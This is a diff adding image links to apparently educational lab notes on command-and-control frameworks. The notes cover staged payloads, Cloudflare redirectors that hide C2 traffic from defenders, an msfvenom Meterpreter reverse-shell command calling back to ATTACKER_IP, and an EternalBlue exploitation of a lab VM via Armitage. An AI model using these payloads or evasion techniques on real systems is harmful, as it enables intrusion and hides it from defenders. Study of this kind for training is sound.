@@ -13,6 +13,8 @@ Working with C2 frameworks also requires general experience with the Metasploit 
 **C2 Framework Structure**
 A C2 Framework is basically a **server for reverse shells**. A similar comparison would be something like a netcat listener that can handle many reverse shells calling back at once, which in the case of C2 frameworks would be the **C2 Agents**.
 
+![](../../assets/storage/images/writeups/intro_to_c2/img001_image4.png)
+
 What makes C2 frameworks superior to simple netcat listeners is their ability to perform well in Post-Exploitation operations.
 
 A great example of a C2 framework with its’own payload generator is **Metasploit**, with its’ **MSFVenom **service.
@@ -22,6 +24,8 @@ A great example of a C2 framework with its’own payload generator is **Metasplo
 **C2 Server**
 
 The C2 server serves as a hub for agents to call back to the C2 server. Agents will periodically reach out to the C2 server and wait for the operator’s commands.
+
+![](../../assets/storage/images/writeups/intro_to_c2/img002_image5.png)
 
 **Agents/Payloads**
 
@@ -52,6 +56,7 @@ Similar to regular reverse shells, payloads come in two types: **Staged **and **
 **Stageless Payloads**
 Stageless payloads basically contain the full C2 Agent inside and immediately callback to the C2 server and then begin beaconing.
 
+![](../../assets/storage/images/writeups/intro_to_c2/img003_image6.png)
 Here is a more intricate display of how Stageless payloads work:
 
 To establish C2 beaconing with a stageless payload, the victim needs to download and execute the Dropper file, and then beaconing to the C2 server can begin.
@@ -61,6 +66,8 @@ Staged Payloads require a callback to the C2 server to download additional parts
 
 This method is preferred over stageless payloads because only a small amount of code needs to be written to retrieve the additional parts of the C2 agent from the C2 server.
 This also makes it easier to obfuscate code in order to bypass AV solutions.
+
+![](../../assets/storage/images/writeups/intro_to_c2/img004_image7.png)
 
 The **steps** for establishing C2 beaconing with a **staged** payload are as follows:1. The victim downloads and executes the Dropper
 2. The Dropper calls back to the C2 Server for Stage 2
@@ -97,6 +104,7 @@ A last major component of C2 frameworks are their pivoting modules, which make i
 
 **This can allow machines in a restricted network segment to still communicate with your C2 Server.**
 
+![](../../assets/storage/images/writeups/intro_to_c2/img005_image8.png)
 The above diagram shows how hosts within a restricted network segment call back to the C2 server:
 1. The Victim calls back to an SMB named pipe on another Victim in a non-restricted network segment.
 1. The Victim in a non-restricted network segment calls back to the C2 server over a standard beacon.
@@ -113,6 +121,8 @@ Cloudflre, for example, provides enhanced metrics on HTTP connection details. It
 
 Red Teamers can abuse this to make it appear so that a workstation or server is communicating to a known, trusted IP Address. The geolocation results will show wherever the nearest Cloudflare server is, and the IP will be belonging to Cloudflare too.
 
+![](../../assets/storage/images/writeups/intro_to_c2/img006_image9.png)
+
 In the above diagram, we can see that the C2 operator has a domain that proxies all requests through Cloudflare.
 The victim then beacons out to the C2 domain, and Cloudflare proxies this request. Then, it looks at the Host Header and relays the traffic to the correct server. The C2 server then responds to Cloudflare with the C2 commands.
 
@@ -127,6 +137,8 @@ Etc.
 
 All proxy features allow a user to control specific elements of an incoming HTTP request.
 If an incoming connection request has a header of “X-C2-Server”, then we would explicitly extract that header using one of the above technologies, and ensure that the C2 server responds with C2 based responses. Whereas, if a normal user queried the HTTP server, they might see a generic webpage. This depends on the configuration.
+
+![](../../assets/storage/images/writeups/intro_to_c2/img007_image10.png)
 
 In the diagram above, we can see how C2 profiles work.
 Firstly, the victim beacons out to the C2 Server with a custom header in the HTTP Request. Meanwhile, the SOC analyst only gets a normal HTTP Request.
@@ -193,11 +205,15 @@ Used by fellow Red Team Operators to access your Armitage server
 
 **Armitage**
 This is the file used to connect to the Armitage Teamserver. Upon executing the binary, a new prompt opens up, displaying connection information and the username (which is more like a nickname, not used for authentication) and password.
+![](../../assets/storage/images/writeups/intro_to_c2/img008_image11.png)
 
 **Preparing the Environment**
 Before we can launch Armitage, we must do a few pre-flight checks to ensure Metasploit is configured properly. Armitage relies heavily on Metasploit's Database functionality, so we must start and initialize the database before launching Armitage. In order to do so, we must execute the following commands:
+![](../../assets/storage/images/writeups/intro_to_c2/img009_image12.png)
 
 Lastly, we set the **MSF_DATABASE_CONFIG** environment variable to the location of the Metasploit **database.yml** file, which in our case is at **/root/.msf4/database.yml**
+
+![](../../assets/storage/images/writeups/intro_to_c2/img010_image13.png)
 
 Now we can start the Armitage server.
 
@@ -218,6 +234,7 @@ For operators to gain access to the server, we should create a new user account 
 Armitage **explicitly denies** users listening on 127.0.0.1 because it is essentially a shared **Metasploit** server with a **“Deconfliction Server”** that when multiple users are connecting to the server, you’re not seeing everything that other users are seeing.
 
 With Armitage, **we must listen on the tun0/eth0 IP Address.**
+![](../../assets/storage/images/writeups/intro_to_c2/img011_image11.png)
 
 After that, we just set a nickname, it can be anything.
 
@@ -231,6 +248,7 @@ Now that we have a general idea of how to set up the C2 server, there are some a
 
 A C2 management interface should **NEVER **be directly accessible. The main reason for this is improving OPSEC.Fingerprinting C2 servers can be quite easy. For example, in versions prior to 3.13, Cobalt Strike C2 servers could be identified by an extra space (**\x20)** at the end of the HTTP Response.
 Using this tactic, Blue Teamers could fingerprint all publicly accessible Cobalt Strike C2 servers.
+![](../../assets/storage/images/writeups/intro_to_c2/img012_image14.png)
 
 **Accessing your Remote C2 server that is listening locally**
 
@@ -263,10 +281,13 @@ To start, we click the Armitage dropdown menu, and go to the Listeners section.
 There are three options here: Bind, Reverse and LHOST.
 Bind refers to Bind Shells; you must connect to these hosts. Reverse refers to standard Reverse Shells; this is the option we will be using.
 
-After clicking "Reverse," a new menu will open up, prompting you to configure some basic details about the listener, specifically what port you want to listen on and what listener type you would like to select. There are two options you can choose from, "Shell" or "Meterpreter". Shell refers to a standard netcat-style reverse shell, and Meterpreter is the standard Meterpreter reverse shell.
+![](../../assets/storage/images/writeups/intro_to_c2/img013_image15.png)
 
+After clicking "Reverse," a new menu will open up, prompting you to configure some basic details about the listener, specifically what port you want to listen on and what listener type you would like to select. There are two options you can choose from, "Shell" or "Meterpreter". Shell refers to a standard netcat-style reverse shell, and Meterpreter is the standard Meterpreter reverse shell.
+![](../../assets/storage/images/writeups/intro_to_c2/img014_image16.png)
 After pressing enter, a new pane will open up, confirming that your listener has been created. This should look like the standard Metasploit exploit/multi/handler module.
 
+![](../../assets/storage/images/writeups/intro_to_c2/img015_image17.png)
 After setting up a listener, you can generate a standard windows/meterpreter/reverse_tcp reverse shell using MSFvenom and set the LHOST to the Armitage server to receive callbacks to our Armitage server.
 
 **Getting a callback**
@@ -274,6 +295,8 @@ After setting up a listener, you can generate a standard windows/meterpreter/rev
 **msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe**
 
 After generating the windows/meterpreter/reverse_tcp using MSFVenom, we can transfer the payload to a target machine and execute it. After a moment or two, you should receive a callback from the machine.
+
+![](../../assets/storage/images/writeups/intro_to_c2/img016_image18.png)
 
 **Listener Type**
 Standard reverse shell listeners are not the only ones that exist. There are many types of listeners, which use different protocols. However, there are a few common ones to cover, like:
@@ -292,16 +315,23 @@ Communicating via SMB named pipes is a popular method of choice, especially when
 **Command, Control and Conquer**
 **Host Enumeration with Armitage**
 Here we are going to exploit a sample VM. First, we execute a port scan within Armitage by going to the “Hosts” section, hovering over “Nmap Scan”and selecting “Quick Scan”.
+![](../../assets/storage/images/writeups/intro_to_c2/img017_image19.png)
 
 After selecting "Quick scan", a new option will pop up; this will prompt you to enter the IP Address range you would like to scan. You should enter the IP Address of the deployed Virtual machine in this box.
 
 After pressing "Ok", and waiting a moment or two, you should see a new tab open up called "nmap" and a new machine display in the "Workspace" window. In the "nmap" tab, you will see the raw scan results.
 
+![](../../assets/storage/images/writeups/intro_to_c2/img018_image20.png)
+
 **Exploitation with Armitage**
 Next up, we're going to show off exploitation with Armitage; our victim in our example is a Windows 7 machine (more specifically, Blue). This machine is vulnerable to the classic exploit "Eternal  Blue".  To find this, we will focus on the far right tab with folders, we will expand the "Exploit" dropdown, then find the "Windows" dropdown, then the "SMB" dropdown, then you will see all of the exploits.
-
+![](../../assets/storage/images/writeups/intro_to_c2/img019_image21.png)
 Next up, you can double click your exploit of choice, or drag and drop the exploit onto the host, and a new window will open up. Clicking "launch" will fire off the exploit.
+![](../../assets/storage/images/writeups/intro_to_c2/img020_image22.png)
 
 After clicking "Launch", you will notice a new "Exploit" tab open up. Armitage will run all of the regular checks that Metasploit normally does. In the case of Eternal Blue, it ran the standard check script followed by the exploit script until it got a successful shell. It's worth noting that by default in this Exploit, it chose a Bind shell. Make sure you fully read the exploit information and options to see if a Bind Shell or a Reverse Shell is an option.
+![](../../assets/storage/images/writeups/intro_to_c2/img021_image23.png)
 
 After you receive your shell, right-click on the host and select "Interact". This will open a standard shell you're familiar with. In order to get a Meterpreter shell, we recommend that you run the multi/manage/shell_to_meterpreter module.
+
+![](../../assets/storage/images/writeups/intro_to_c2/img022_image24.png)
